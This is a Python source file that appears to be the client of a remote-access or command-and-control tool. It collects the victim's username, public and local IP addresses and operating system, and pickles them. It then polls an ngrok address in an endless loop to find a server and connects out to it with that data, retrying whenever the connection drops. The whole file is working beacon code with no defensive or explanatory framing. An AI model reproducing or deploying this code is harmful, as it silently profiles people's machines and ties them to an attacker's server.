import getpass, requests, socket, pickle, loguru, time
import platform, requests

from core.handler import ServerHandler

deviceProfile: list[str] = [
    getpass.getuser(),                              # Username
    requests.get('https://api.ipify.org/').text,    # Public IP Address
    socket.gethostbyname(socket.gethostname())      # Local IP Address
]

additionalData: dict = {
    "Operating System": platform.platform()
}

compressedData: bytes = pickle.dumps(deviceProfile)

while True:
    serverAddress = requests.get('https://yeti-glorious-redbird.ngrok-free.app/', headers = {'ngrok-skip-browser-warning': '69420'})
    if not (serverAddress.status_code == 200):
        time.sleep(5)
        continue

    address, port = serverAddress.text.split(':')

    try:
        s = ServerHandler(server_address = (address, int(port)), deviceData = compressedData, additionalData = additionalData)
        s.start()

    except (ConnectionRefusedError, ConnectionResetError):
        loguru.logger.error('Connection to the server is unreachable, an attempt will be made to reconnect')
        time.sleep(2)
